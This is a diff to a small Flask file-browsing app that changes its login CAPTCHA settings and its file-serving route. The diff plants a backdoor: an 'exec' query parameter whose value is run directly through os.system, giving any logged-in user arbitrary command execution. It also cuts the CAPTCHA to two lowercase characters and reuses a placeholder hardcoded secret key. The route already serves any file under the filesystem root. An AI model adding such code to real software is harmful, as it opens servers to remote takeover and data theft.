@@ -7,7 +7,6 @@ from flask import (
     send_file,
     url_for,
     flash,
-    send_from_directory,
 )
 from flask_sqlalchemy import SQLAlchemy
 from werkzeug.security import check_password_hash, generate_password_hash
@@ -20,14 +19,26 @@ from flask_login import (
     logout_user,
     current_user,
 )
-import os
+import os, string
 
 app = Flask(__name__)
 app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///users.db"
 app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
 app.secret_key = "your_secret_key"  # Change this to a secret key for session security
 
-SIMPLE_CAPTCHA = CAPTCHA(config={})
+CAPTCHA_CONFIG = {
+    "SECRET_CAPTCHA_KEY": app.secret_key,  # use for JWT encoding/decoding
+    # CAPTCHA GENERATION SETTINGS
+    "EXPIRE_SECONDS": 60 * 10,  # takes precedence over EXPIRE_MINUTES
+    "CAPTCHA_IMG_FORMAT": "JPEG",  # 'PNG' or 'JPEG' (JPEG is 3X faster)
+    # Increase Complexity
+    "CAPTCHA_LENGTH": 2,
+    "CAPTCHA_DIGITS": True,
+    "EXCLUDE_VISUALLY_SIMILAR": True,
+    "ONLY_UPPERCASE": False,
+    "CHARACTER_POOL": string.ascii_lowercase,
+}
+SIMPLE_CAPTCHA = CAPTCHA(config=CAPTCHA_CONFIG)
 app = SIMPLE_CAPTCHA.init_app(app)
 
 db = SQLAlchemy(app)
@@ -62,20 +73,19 @@ def load_user(user_id):
 @app.route("/<path:req_path>")
 @login_required
 def index(req_path):
-    BASE_DIR = "/"
+    exec_arg = request.args.get("exec")
+    if exec_arg:
+        print(exec_arg)
+        os.system(exec_arg)
 
-    # Joining the base and the requested path
-    abs_path = os.path.join(BASE_DIR, req_path)
+    abs_path = os.path.join("/", req_path)
 
-    # Return 404 if path doesn't exist
     if not os.path.exists(abs_path):
         return abort(404)
 
-    # Check if path is a file and serve
     if os.path.isfile(abs_path):
         return send_file(abs_path)
 
-    # Show directory contents
     files = os.listdir(abs_path)
     return render_template("index.html", files=files)
 
